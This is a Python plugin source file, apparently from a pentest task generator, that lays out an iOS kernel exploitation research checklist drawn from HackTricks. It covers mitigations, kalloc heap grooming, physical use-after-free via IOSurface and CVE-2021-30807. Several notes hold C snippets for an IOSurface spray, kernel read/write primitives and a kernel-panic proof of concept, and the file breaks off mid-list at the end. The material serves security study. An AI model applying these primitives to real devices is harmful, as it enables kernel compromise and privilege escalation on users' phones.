"""
iOS Binary Exploitation plugin

Generates tasks for iOS kernel exploitation including:
- iOS kernel heap exploitation techniques (old vs modern)
- Physical use-after-free via IOSurface
- CVE-2021-30807 (IOMobileFrameBuffer OOB)
- CVE-2020-27950 (Mach message trailer leak)
- iOS kernel mitigations (PAC, PPL, SPTM, KTRR)
- Heap grooming and feng shui techniques
- iOS kernel memory read/write primitives

Extracted from HackTricks: binary-exploitation/ios-exploiting/
Generated by: CrackPot v1.0

Note: This plugin focuses on iOS-specific kernel exploitation research.
Most techniques require physical device access or jailbroken iOS devices.
Primarily educational for understanding modern iOS security architecture.
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class iOSBinaryExploitPlugin(ServicePlugin):
    """iOS kernel binary exploitation research plugin"""

    @property
    def name(self) -> str:
        return "ios-binary-exploit"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-based; research-oriented

    @property
    def service_names(self) -> List[str]:
        return ['ios-kernel', 'ios-exploit', 'mobile-kernel']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Detect iOS kernel exploitation research context

        This plugin does not auto-detect from network scans.
        It's designed for manual invocation during iOS research.
        """
        # Manual-only plugin for iOS kernel research
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate iOS binary exploitation research task tree"""

        ios_version = service_info.get('version', 'unknown')
        device_type = service_info.get('product', 'iOS device')

        tasks = {
            'id': 'ios-kernel-exploit',
            'name': f'iOS Kernel Exploitation Research: {device_type}',
            'type': 'parent',
            'children': []
        }

        # SECTION 1: iOS Security Mitigations Analysis
        tasks['children'].append({
            'id': 'ios-mitigations-analysis',
            'name': 'iOS Security Mitigations Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': 'code-signing-check',
                    'name': 'Code Signing & CoreTrust Verification',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Verify iOS code signing enforcement and CoreTrust subsystem status',
                        'tags': ['OSCP:LOW', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
iOS Code Signing enforces that all executable code must be cryptographically
signed by Apple. CoreTrust verifies signatures at runtime without cached trust.

Key Points:
- Every app, library, extension must have valid Apple signature
- CoreTrust directly verifies against Apple root certificate
- Modified binaries are blocked from execution
- Prevents code injection and unsigned binary execution

Research Steps:
1. Check device jailbreak status: checkra1n, unc0ver, etc.
2. Verify code signing status: codesign -dv /path/to/binary
3. Attempt to run unsigned binary (will fail on non-jailbroken)
4. Research CoreTrust bypass techniques (iOS version specific)
                        """,
                        'alternatives': [
                            'ldid -S /path/to/binary (sign with fake signature on jailbroken device)',
                            'jtool --sig /path/to/binary (inspect signature)',
                            'Check entitlements: codesign -d --entitlements - /path/to/binary'
                        ],
                        'success_indicators': [
                            'Binary signature verified successfully',
                            'CoreTrust enforcement detected',
                            'Unsigned binary execution blocked'
                        ],
                        'failure_indicators': [
                            'Device is jailbroken (mitigations may be bypassed)',
                            'Code signing disabled',
                            'CoreTrust checks not enforced'
                        ],
                        'next_steps': [
                            'Document iOS version and security patch level',
                            'Research version-specific CoreTrust bypasses',
                            'Identify if PPL/SPTM is active (A12+ devices)'
                        ]
                    }
                },
                {
                    'id': 'dep-aslr-check',
                    'name': 'DEP & ASLR/KASLR Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze Data Execution Prevention and Address Space Layout Randomization',
                        'tags': ['OSCP:LOW', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
DEP (Data Execution Prevention):
- Marks memory regions as non-executable (stack, heap)
- Forces attackers to use ROP/JOP instead of direct shellcode
- Cannot inject and execute shellcode in data regions

ASLR (Address Space Layout Randomization):
- Randomizes code, library, stack, heap addresses at runtime
- Breaks exploits depending on fixed memory layouts
- Requires info leaks to bypass

KASLR (Kernel ASLR):
- Randomizes kernel base address at boot
- Prevents reliable kernel function/structure location
- Raises difficulty of kernel exploits significantly
                        """,
                        'alternatives': [
                            'Check ASLR: vmmap -w PID | grep __TEXT (changes each run)',
                            'Kernel slide detection: jtool -l /path/to/kernelcache',
                            'Disable ASLR (jailbreak required): launchctl setenv DYLD_NO_PIE YES'
                        ],
                        'success_indicators': [
                            'DEP enforced on stack/heap pages',
                            'ASLR randomizes base addresses',
                            'KASLR active (kernel base changes per boot)'
                        ],
                        'next_steps': [
                            'Develop info leak primitives for ASLR bypass',
                            'Research ROP gadgets for DEP bypass',
                            'Map kernel slide calculation techniques'
                        ]
                    }
                },
                {
                    'id': 'pac-ktrr-check',
                    'name': 'PAC & KTRR Hardware Protections',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze Pointer Authentication Codes and Kernel Text Read-Only Region',
                        'tags': ['OSCP:LOW', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
PAC (Pointer Authentication Codes) - A12+ devices:
- Cryptographically signs pointers with CPU secret key
- Validates pointer integrity before dereferencing
- Prevents pointer forgery in memory corruption exploits
- Makes ROP/JOP exploitation extremely difficult

KTRR (Kernel Text Read-Only Region):
- Hardware-enforced read-only kernel code section
- Locked at boot by MMU/CPU memory controller
- Even kernel cannot modify its own code pages
- Prevents runtime kernel code patching

Impact on Exploitation:
- PAC breaks traditional ROP chains (signed return addresses)
- KTRR prevents kernel code injection/patching
- Requires different exploitation primitives (data-only attacks)
                        """,
                        'alternatives': [
                            'Check PAC status: sysctl hw.optional.arm.FEAT_PAuth',
                            'Detect A-series chip: uname -m (arm64e = A12+)',
                            'KTRR research: Study XNU source for KTRR_LOCK implementation'
                        ],
                        'success_indicators': [
                            'PAC enabled (arm64e architecture)',
                            'KTRR locked kernel text pages',
                            'Pointer signing/validation active'
                        ],
                        'next_steps': [
                            'Research PAC bypass techniques (JOP-free methods)',
                            'Focus on data-only exploitation strategies',
                            'Study PPL/SPTM interaction with KTRR'
                        ]
                    }
                },
                {
                    'id': 'ppl-sptm-check',
                    'name': 'PPL & SPTM Advanced Protections',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze Page Protection Layer and Secure Page Table Monitor',
                        'tags': ['OSCP:LOW', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
PPL (Page Protection Layer) - iOS 14+:
- Protects critical kernel memory (code signing, entitlements)
- Uses MMU to enforce strict write protections
- Even privileged kernel code cannot modify PPL-protected pages
- Prevents tampering with security-critical structures

SPTM (Secure Page Table Monitor) - A15/M2+ devices:
- Hardware-level page table protection
- Monitors and validates all page table updates
- Prevents silent page remapping by kernel
- Extends PPL with hardware enforcement

PAN (Privilege Access Never):
- Prevents kernel from directly accessing user-space memory
- Must explicitly enable access before read/write
- Stops kernel exploits from easily stealing user data
- Enforces strict kernel/user separation

Impact: Physical UAF techniques (IOSurface) far less viable on iOS 16+ with PPL/SPTM.
                        """,
                        'alternatives': [
                            'Check iOS version: sw_vers (iOS 16+ has SPTM on supported devices)',
                            'Detect PPL: Research XNU pmap_cs.c implementation',
                            'Analyze boot logs for SPTM initialization'
                        ],
                        'success_indicators': [
                            'PPL active (iOS 14+)',
                            'SPTM enforced (A15/M2+ on iOS 16+)',
                            'PAN prevents direct user memory access'
                        ],
                        'next_steps': [
                            'Research PPL bypass techniques (rare, high complexity)',
                            'Focus on pre-PPL iOS versions for research',
                            'Study SPTM architecture for understanding limits'
                        ]
                    }
                }
            ]
        })

        # SECTION 2: Old Kernel Heap Analysis (Pre-iOS 15)
        tasks['children'].append({
            'id': 'old-heap-analysis',
            'name': 'Old Kernel Heap Analysis (Pre-iOS 15 / Pre-A12)',
            'type': 'parent',
            'children': [
                {
                    'id': 'kalloc-zones-enum',
                    'name': 'kalloc Zone Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate and analyze kalloc zone allocator structure',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Pre-iOS 15 Kernel Heap Architecture:
- Zone allocator (kalloc) with fixed-size zones
- Each zone stores allocations of single size class
- Zones: kalloc.16, kalloc.32, kalloc.64, kalloc.128, ..., kalloc.1280

Zone Structure:
| Zone             | Size   | Typical Use Cases                    |
|------------------|--------|--------------------------------------|
| kalloc.16        | 16B    | Small structs, pointers              |
| kalloc.32        | 32B    | Object headers                       |
| kalloc.64        | 64B    | IPC messages, small buffers          |
| kalloc.128       | 128B   | OSObject parts                       |
| kalloc.256       | 256B   | IPC messages, arrays                 |
| kalloc.1280      | 1280B  | IOSurface metadata                   |

Key Exploitation Properties:
- Predictable adjacency (same-size objects side-by-side)
- Heap overflow overwrites next object in same zone
- Heap spraying highly effective (fill zone with controlled data)
                        """,
                        'alternatives': [
                            'Analyze with lldb: memory read -c 256 <zone_address>',
                            'Kernel debugging: zprint (lists all zones)',
                            'Research XNU source: osfmk/kern/kalloc.c'
                        ],
                        'success_indicators': [
                            'Zone layout mapped successfully',
                            'Size classes identified',
                            'Freelist structure understood'
                        ],
                        'next_steps': [
                            'Map common object sizes to zones',
                            'Identify target objects for heap feng shui',
                            'Develop heap spray strategy'
                        ]
                    }
                },
                {
                    'id': 'freelist-analysis',
                    'name': 'Freelist Structure Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze kalloc freelist implementation and exploitation primitives',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Freelist Implementation (Pre-hardening):
- Freed chunks stored in linked list (freelist)
- First 8 bytes of freed chunk = pointer to next free chunk
- HEAD pointer tracks first free chunk in zone

Allocation:
1. Pop HEAD (return memory to caller)
2. HEAD = HEAD->next (stored in freed chunk header)

Freeing:
1. freed_chunk->next = HEAD
2. HEAD = freed_chunk

Exploitation Primitives:
1. Heap Overflow: Overwrite adjacent freed chunk's next pointer
2. Use-After-Free: Write to freed object, corrupt next pointer
3. Result: Next allocation returns attacker-controlled address

Visual Example:
Before:  HEAD → [F1] → [F2] → [F3] → NULL
Attack:  Overwrite F1->next to 0xDEADBEEFCAFEBABE
After:   Next alloc returns memory at attacker address!

This freelist design made pre-hardening exploits highly reliable.
                        """,
                        'alternatives': [
                            'lldb: memory read <freed_chunk> (view next pointer)',
                            'Heap visualization: heap -addresses <zone>',
                            'Trigger UAF: Free object, write to freed memory, allocate'
                        ],
                        'success_indicators': [
                            'Freelist pointers identified',
                            'Next pointer corruption successful',
                            'Arbitrary allocation achieved'
                        ],
                        'failure_indicators': [
                            'Modern heap with safe-linking (iOS 14+)',
                            'Freelist XOR encoding detected',
                            'Allocation panics on corrupted pointer'
                        ],
                        'next_steps': [
                            'Develop UAF primitive for freelist poisoning',
                            'Test heap overflow into adjacent freed chunk',
                            'Create fake object for type confusion'
                        ]
                    }
                },
                {
                    'id': 'heap-feng-shui',
                    'name': 'Heap Grooming & Feng Shui',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Perform heap grooming to achieve predictable memory layout',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Heap Feng Shui Technique:
Goal: Shape heap so victim object is adjacent to attacker-controlled object

Steps:
1. Spray allocations (fill fragmented holes)
   - Make lots of dummy allocations to fill gaps in zone
   - Heap becomes packed and predictable

2. Force new pages
   - Fill existing holes → new allocations come from fresh pages
   - Fresh pages = objects clustered together, not fragmented

3. Place attacker objects
   - Spray controlled objects in new pages
   - All same size → same zone → predictable neighbors

4. Free a controlled object (create gap)
   - Deliberately free one attacker object
   - Creates hole that allocator will reuse (freelist LIFO)

5. Victim object lands in gap
   - Trigger kernel to allocate victim object
   - Freelist reuses freed slot → victim placed exactly where we want

6. Overflow/UAF into victim
   - Attacker objects surround victim
   - Overflow from attacker object → overwrite victim fields

Why It Works:
- Zone allocator predictability (same size = same zone)
- Freelist LIFO (most recent free = next allocation)
- Heap sprays control layout
                        """,
                        'alternatives': [
                            'Spray via IOSurface: Create many IOSurface objects',
                            'Spray via Mach ports: Allocate many port objects',
                            'Spray via OSData: Create OSData objects with controlled sizes'
                        ],
                        'success_indicators': [
                            'Victim object adjacent to attacker object',
                            'Overflow reaches victim object fields',
                            'Controlled data overwrites victim successfully'
                        ],
                        'failure_indicators': [
                            'Modern heap randomization (iOS 15+)',
                            'Typed zones separate attacker/victim objects',
                            'Allocation doesn\'t reuse freed slot'
                        ],
                        'next_steps': [
                            'Measure heap spray success rate',
                            'Adjust spray count for reliability',
                            'Trigger vulnerability after successful groom'
                        ]
                    }
                }
            ]
        })

        # SECTION 3: Modern Kernel Heap (iOS 15+)
        tasks['children'].append({
            'id': 'modern-heap-analysis',
            'name': 'Modern Kernel Heap Analysis (iOS 15+ / A12+)',
            'type': 'parent',
            'children': [
                {
                    'id': 'kalloc-type-system',
                    'name': 'kalloc_type System Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze modern kalloc_type typed zone allocator',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Modern kalloc_type System (iOS 15+):

Before (Classic kalloc):
- Single kalloc.<size> zone per size class
- All objects of same size in same zone
- Attacker OSData could neighbor privileged task_t

After (kalloc_type):
- Each object TYPE has dedicated zone
- Types: ipc_port_t, task_t, OSString, OSData, etc.
- Type-to-zone mapping generated at compile time
- Same-size objects of different types = DIFFERENT ZONES

Impact on Exploitation:
- Cannot guarantee controlled data neighbors sensitive objects
- Heap sprays far less reliable
- Need type-specific bugs or info leaks
- Heap feng shui difficulty increased dramatically

Example:
- OSData (attacker-controlled) → kalloc_type_osdata zone
- task_t (sensitive kernel object) → kalloc_type_task zone
- Even if both are 64 bytes, they NEVER neighbor each other!
                        """,
                        'alternatives': [
                            'Research XNU source: osfmk/kern/kalloc_type.c',
                            'Analyze zone mappings: zprint -t (on test kernel)',
                            'Study compiler-generated type tables'
                        ],
                        'success_indicators': [
                            'Type segregation confirmed',
                            'Zone-per-type architecture understood',
                            'Spray limitations identified'
                        ],
                        'next_steps': [
                            'Identify same-type objects for targeting',
                            'Research type confusion vulnerabilities',
                            'Develop info leak primitives'
                        ]
                    }
                },
                {
                    'id': 'safe-linking-analysis',
                    'name': 'Safe-Linking & Freelist Encoding',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze XOR-encoded freelist pointers (safe-linking)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Safe-Linking (iOS 14+ freelist hardening):

Old Freelist:
- freed_chunk->next = raw pointer to next free chunk
- Attacker can overwrite with arbitrary address
- Next allocation returns attacker-chosen memory

New Freelist (Safe-Linking):
- freed_chunk->next = REAL_NEXT_PTR XOR ZONE_SECRET
- Each zone has secret cookie (per-boot random)
- Attacker cannot forge valid next pointer without knowing secret

Exploitation Impact:
- UAF write to freed chunk no longer yields arbitrary allocation
- Freelist corruption requires secret key leak
- Raises bar significantly for heap exploitation

Defense Mechanism:
1. Allocation: next = stored_value XOR ZONE_SECRET
2. Freeing: stored_value = next_ptr XOR ZONE_SECRET
3. Validation: Check pointer sanity before use

Bypass Requirements:
- Leak zone secret cookie
- Compute valid XOR-encoded pointer
- Corrupt freelist with encoded value
                        """,
                        'alternatives': [
                            'Analyze encoding: lldb breakpoint on kalloc allocation',
                            'Research zone secret location in kernel memory',
                            'Study XNU kalloc.c safe-linking implementation'
                        ],
                        'success_indicators': [
                            'XOR encoding mechanism understood',
                            'Zone secret identified',
                            'Pointer validation logic mapped'
                        ],
                        'next_steps': [
                            'Develop zone secret leak primitive',
                            'Calculate encoded pointers for testing',
                            'Research alternative heap primitives'
                        ]
                    }
                },
                {
                    'id': 'guarded-zones-analysis',
                    'name': 'Guarded Allocations & Redzones',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze guarded zones for critical kernel objects',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Guarded Zones (Critical Object Protection):

Protected Objects:
- Credentials (ucred)
- Task structures
- Process metadata
- Security-sensitive kernel objects

Protection Mechanisms:
1. Guard Pages: Unmapped memory between slabs
   - Overflow into guard page → immediate fault/panic
   - Prevents silent corruption

2. Redzones: Canary bytes around objects
   - Checked on free/access
   - Overflow detection

3. Separate Allocation Paths:
   - Critical objects bypass normal kalloc
   - Dedicated zones with extra validation
   - Randomized placement within pages

Impact on Exploitation:
- Overflow into credential → panic instead of success
- Cannot easily corrupt critical structures
- Requires precise targeting of non-guarded objects

Example:
Old: Overflow 64-byte buffer → overwrite adjacent ucred → privilege escalation
New: Overflow → hit guard page → kernel panic (DoS only)
                        """,
                        'alternatives': [
                            'Identify guarded objects: Study XNU zone creation code',
                            'Test overflow behavior: Trigger controlled overflow',
                            'Analyze panic logs for guard page faults'
                        ],
                        'success_indicators': [
                            'Guard pages detected between critical slabs',
                            'Redzone corruption triggers panic',
                            'Critical objects segregated from normal heap'
                        ],
                        'next_steps': [
                            'Map non-guarded objects for targeting',
                            'Develop data-only exploitation strategy',
                            'Avoid triggering guard page faults'
                        ]
                    }
                }
            ]
        })

        # SECTION 4: Physical Use-After-Free (IOSurface)
        tasks['children'].append({
            'id': 'physical-uaf-iosurface',
            'name': 'Physical Use-After-Free via IOSurface (Pre-iOS 16)',
            'type': 'parent',
            'children': [
                {
                    'id': 'puaf-concept',
                    'name': 'Physical UAF Concept Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand physical use-after-free vulnerability mechanism',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'RESEARCH', 'IOS'],
                        'notes': """
Physical Use-After-Free (PUAF):

Vulnerability Flow:
1. Process allocates memory (readable/writable)
2. Page tables map virtual address to physical address
3. Process frees memory
4. BUG: Kernel forgets to remove page table mapping
5. Kernel marks physical memory as free
6. Kernel reallocates physical memory for kernel data
7. Process still has mapping → can read/write kernel memory!

Result: User process can access kernel pages directly

iOS Memory Management Context:
- Virtual memory space: 0x0 to 0x8000000000 (user processes)
- Page tables translate virtual → physical addresses
- Three-level hierarchy: L1 → L2 → L3 page tables
- L3 granularity: 4KB pages

Page Table Levels:
| Level | Virtual Range Coverage | Use Case                  |
|-------|------------------------|---------------------------|
| L1    | 256 GB (0x1000000000) | Top-level page table      |
| L2    | 32 MB  (0x2000000)    | Second-level mapping      |
| L3    | 4 KB                   | Individual page mapping   |

PUAF Exploitation:
- Freed memory page table entry remains valid
- Kernel reuses physical page for sensitive data
- Process reads/writes kernel data through stale mapping
                        """,
                        'alternatives': [
                            'Study iOS memory management: XNU pmap implementation',
                            'Analyze page table structure: lldb memory dumps',
                            'Research CVE-2016-1825 (original PUAF discovery)'
                        ],
                        'success_indicators': [
                            'PUAF mechanism understood',
                            'Page table behavior mapped',
                            'Stale mapping exploitation flow clear'
                        ],
                        'next_steps': [
                            'Identify PUAF triggers (specific iOS bugs)',
                            'Develop IOSurface heap spray technique',
                            'Create kernel read/write primitives'
                        ]
                    }
                },
                {
                    'id': 'iosurface-spray',
                    'name': 'IOSurface Heap Spray Technique',
                    'type': 'command',
                    'metadata': {
                        'command': f'# IOSurface spray pseudo-code (requires jailbroken device)\n# spray_iosurface(client, nSurfaces, clients, nClients)',
                        'description': 'Spray IOSurface objects to win kernel memory race after PUAF',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH', 'IOS', 'MANUAL'],
                        'flag_explanations': {
                            'client': 'IOSurfaceRootUserClient connection handle',
                            'nSurfaces': 'Number of IOSurface objects to create (spray count)',
                            'surface_id': 'Kernel-assigned IOSurface ID for tracking',
                            'IOSURFACE_MAGIC': 'Magic value (0x41414141) for identifying sprayed objects'
                        },
                        'notes': """
IOSurface Spray Strategy:

Goal: Fill freed physical pages with IOSurface objects we control

Why IOSurface?
- Accessible from sandboxed processes (WebKit, apps)
- Allocates kernel memory of controllable size
- Has identifiable "magic value" fields
- Well-documented exploitation primitive

Spray Process:
1. Connect to IOSurfaceRootUserClient
2. Create ~1000-4000 IOSurface objects
3. Set pixel_format field to IOSURFACE_MAGIC (0x41414141)
4. Kernel allocates IOSurface structures in kalloc zones
5. Probability: One IOSurface lands on freed PUAF page

Detection:
- Scan freed pages for IOSURFACE_MAGIC value
- If found → we have kernel memory access via that IOSurface!

C Code Pattern:
```c
void spray_iosurface(io_connect_t client, int nSurfaces) {
    for (int i = 0; i < nSurfaces; i++) {
        fast_create_args_t args;
        args.pixel_format = IOSURFACE_MAGIC;
        args.alloc_size = i + 1; // Unique ID for tracking
        IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, ...);
    }
}
```

Success Rate: ~70-90% on vulnerable iOS versions (< iOS 16)
                        """,
                        'alternatives': [
                            'Mach port spray: Allocate many mach_port_t objects',
                            'Pipe buffer spray: Create pipes with controlled data',
                            'OSData spray: Allocate OSData kernel objects'
                        ],
                        'success_indicators': [
                            'IOSURFACE_MAGIC found in freed page',
                            'Spray fills target kalloc zone',
                            'IOSurface object accessible from userspace'
                        ],
                        'failure_indicators': [
                            'iOS 16+ with PPL/SPTM (spray ineffective)',
                            'IOSurface allocations segregated',
                            'No PUAF pages available'
                        ],
                        'next_steps': [
                            'Scan freed pages for magic value',
                            'Identify successful IOSurface object',
                            'Develop kernel read/write with IOSurface'
                        ]
                    }
                },
                {
                    'id': 'iosurface-krw',
                    'name': 'IOSurface Kernel Read/Write Primitives',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Achieve arbitrary kernel read/write using IOSurface object',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'IOS', 'MANUAL'],
                        'notes': """
IOSurface Kernel Read/Write Primitives:

Key IOSurface Fields:
1. use_count_pointer: Allows 32-bit read (offset: +0x14)
2. indexed_timestamp_pointer: Allows 64-bit write

32-Bit Kernel Read:
```c
uint32_t iosurface_kread32(uint64_t addr) {
    // Save original pointer
    uint64_t orig = iosurface_get_use_count_pointer(info.object);

    // Redirect to target address (minus 0x14 offset)
    iosurface_set_use_count_pointer(info.object, addr - 0x14);

    // Read via get_use_count method (selector 16)
    uint32_t value = get_use_count(info.client, info.surface);

    // Restore original pointer
    iosurface_set_use_count_pointer(info.object, orig);

    return value;
}
```

64-Bit Kernel Write:
```c
void iosurface_kwrite64(uint64_t addr, uint64_t value) {
    uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);

    // Redirect to target address
    iosurface_set_indexed_timestamp_pointer(info.object, addr);

    // Write via set_indexed_timestamp method (selector 33)
    set_indexed_timestamp(info.client, info.surface, value);

    iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```

Complete Exploit Chain:
1. Trigger PUAF → freed pages accessible
2. Spray IOSurface objects → land on freed page
3. Find IOSurface via magic value scan
4. Overwrite use_count_pointer field → arbitrary read
5. Overwrite indexed_timestamp_pointer → arbitrary write
6. Full kernel memory access achieved!

Limitations:
- Read is 32-bit only (need two reads for 64-bit values)
- Requires finding IOSurface in freed page first
- iOS 16+ PPL/SPTM blocks this technique
                        """,
                        'alternatives': [
                            'pipe_buffer primitive: Use pipe I/O for kernel r/w',
                            'mach_port OOL descriptors: Leak/write via Mach messages',
                            'task_t structure manipulation: Direct task pointer corruption'
                        ],
                        'success_indicators': [
                            'Arbitrary kernel read working',
                            'Arbitrary kernel write working',
                            'IOSurface pointers redirected successfully'
                        ],
                        'failure_indicators': [
                            'PPL blocks pointer modifications',
                            'IOSurface methods return errors',
                            'Kernel panics on invalid address'
                        ],
                        'next_steps': [
                            'Leak kernel addresses (KASLR bypass)',
                            'Find task_t structure in memory',
                            'Escalate to root privileges'
                        ]
                    }
                },
                {
                    'id': 'puaf-limitations',
                    'name': 'PUAF Limitations on Modern iOS',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand why PUAF is ineffective on iOS 16+ devices',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'MANUAL'],
                        'notes': """
Modern iOS PUAF Mitigations (iOS 16+ / A12+):

PPL (Page Protection Layer):
- Enforces strict MMU protections on sensitive pages
- Code signing, entitlements, security-critical data protected
- Even if page reused, userland writes blocked by PPL
- Prevents tampering from kernel-level exploits

SPTM (Secure Page Table Monitor) - A15/M2+:
- Hardware-level page table enforcement
- Validates all page table updates
- Prevents silent page remapping
- Blocks stale mapping exploitation

KTRR (Kernel Text Read-Only Region):
- Locks kernel code pages as read-only after boot
- Prevents runtime kernel code modification
- Closes vector for code injection via PUAF

IOSurface Hardening:
- IOSurface allocations less predictable
- Guarded with entitlements and sandbox restrictions
- Harder to map into user-accessible regions
- Magic value scanning less reliable

Impact Summary:
| Mitigation | Effect on PUAF                          |
|------------|-----------------------------------------|
| PPL        | Blocks writes to reused pages           |
| SPTM       | Prevents stale page table mappings      |
| KTRR       | Protects kernel code from modification  |
| IOSurface  | Spray unreliable, access restricted     |

Result: PUAF techniques effective only on iOS < 16 or pre-A12 devices.
Research focus should be on these older platforms or finding new primitives.
                        """,
                        'success_indicators': [
                            'Mitigation architecture understood',
                            'PPL/SPTM boundaries identified',
                            'Platform limitations documented'
                        ],
                        'next_steps': [
                            'Focus research on pre-iOS 16 devices',
                            'Study PPL bypass research (rare)',
                            'Explore alternative exploitation primitives'
                        ]
                    }
                }
            ]
        })

        # SECTION 5: CVE-2021-30807 (IOMobileFrameBuffer OOB)
        tasks['children'].append({
            'id': 'cve-2021-30807',
            'name': 'CVE-2021-30807: IOMobileFrameBuffer OOB',
            'type': 'parent',
            'children': [
                {
                    'id': 'iomfb-bug-analysis',
                    'name': 'IOMobileFrameBuffer Bug Analysis',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Analyze IOMobileFrameBuffer out-of-bounds read vulnerability',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH', 'IOS', 'CVE'],
                        'notes': """
CVE-2021-30807: IOMobileFrameBuffer OOB Read & Type Confusion

Affected Versions:
- iOS/iPadOS < 14.7.1
- macOS Big Sur < 11.5.1
- watchOS < 7.6.1

Vulnerability Details:

Bug Location: External method #83 of IOMobileFramebufferUserClient
- IOMobileFramebufferUserClient::s_displayed_fb_surface(...)
- Forwards to IOMobileFramebufferLegacy::get_displayed_surface(this, task*, out_id, scalar0)

The Flaw:
- scalar0 is user-controlled 32-bit value
- Used as INDEX into internal pointer array WITHOUT bounds check
- Formula: ptr = *(this + 0xA58 + scalar0 * 8)
- Passed to IOSurfaceRoot::copyPortNameForSurfaceInTask(...) as IOSurface*

Consequences:
1. Out-of-bounds pointer read from kernel memory
2. Type confusion (arbitrary memory treated as IOSurface*)
3. If pointer invalid → kernel dereference panic (DoS)
4. If pointer valid → leak kernel data / escalate privileges

Entitlement Protection:
- Requires: com.apple.private.allow-explicit-graphics-priority
- WebKit.WebContent HAS this entitlement!
- Vulnerability reachable from sandboxed WebContent process

Exploitation Path:
1. Open IOMobileFramebuffer/AppleCLCD service (type 2 user client)
2. Spray IOSurface objects to fill kernel heap
3. Call external method 83 with large scalar0 value
4. OOB read hits sprayed IOSurface pointer
5. Kernel returns Mach port name to "IOSurface"
6. Use port to read/write kernel memory
                        """,
                        'alternatives': [
                            'Study original writeup: https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/',
                            'Analyze PoC: https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC',
                            'Research jsherman212 analysis: https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html'
                        ],
                        'success_indicators': [
                            'Vulnerability mechanism understood',
                            'OOB index calculation verified',
                            'Type confusion impact analyzed'
                        ],
                        'next_steps': [
                            'Test DoS PoC on vulnerable device',
                            'Develop heap spray for exploitation',
                            'Create arbitrary read primitive'
                        ]
                    }
                },
                {
                    'id': 'iomfb-dos-poc',
                    'name': 'IOMobileFrameBuffer DoS PoC',
                    'type': 'command',
                    'metadata': {
                        'command': '# Compile: clang -o iomfb_dos iomfb_dos.c -framework IOKit\n# Run: ./iomfb_dos',
                        'description': 'Trigger CVE-2021-30807 kernel panic (DoS only)',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'CVE', 'DOS'],
                        'flag_explanations': {
                            'IOServiceGetMatchingService': 'Find IOMobileFramebuffer service in IORegistry',
                            'IOServiceMatching': 'Create matching dictionary for service lookup',
                            'IOServiceOpen': 'Open user client connection (type 2 = vulnerable variant)',
                            'IOConnectCallMethod': 'Call external method on user client',
                            'selector 83': 'Vulnerable external method (s_displayed_fb_surface)',
                            'scalars[0]': 'User-controlled index (0x41414141 = large OOB value)'
                        },
                        'notes': """
DoS PoC Explanation:

C Code Flow:
```c
// 1. Find IOMobileFramebuffer service
io_service_t service = IOServiceGetMatchingService(
    kIOMasterPortDefault,
    IOServiceMatching("IOMobileFramebuffer")
);

// 2. Open user client (type 2 exposes selector 83)
io_connect_t conn;
IOServiceOpen(service, mach_task_self(), 2, &conn);

// 3. Prepare OOB index (0x41414141 / 8 = slot far out of bounds)
uint64_t scalars[1] = { 0x41414141 };

// 4. Trigger vulnerability
IOConnectCallMethod(
    conn,
    83,              // Vulnerable selector
    scalars, 1,      // OOB index input
    NULL, 0,
    output, &size,
    NULL, NULL
);

// Result: Kernel dereferences invalid pointer → panic
```

Expected Outcome:
- Kernel panic with dereferencing null/invalid pointer
- Proves vulnerability existence
- Device reboots (DoS)

WARNING: Only test on devices you own! This WILL crash the device.

Next Steps: Add IOSurface spray to make OOB read hit valid object.
                        """,
                        'alternatives': [
                            'BinDiff analysis: Compare vulnerable vs patched kernelcache',
                            'Static analysis: Reverse engineer IOMobileFramebufferUserClient',
                            'Ghidra: Load kernelcache and find s_displayed_fb_surface'
                        ],
                        'success_indicators': [
                            'Kernel panic triggered',
                            'Device reboots immediately',
                            'Crash log shows IOMobileFramebuffer dereference'
                        ],
                        'failure_indicators': [
                            'iOS 14.7.1+ (patched)',
                            'Entitlement missing (non-WebKit process)',
                            'Service not found (device-specific issue)'
                        ],
                        'next_steps': [
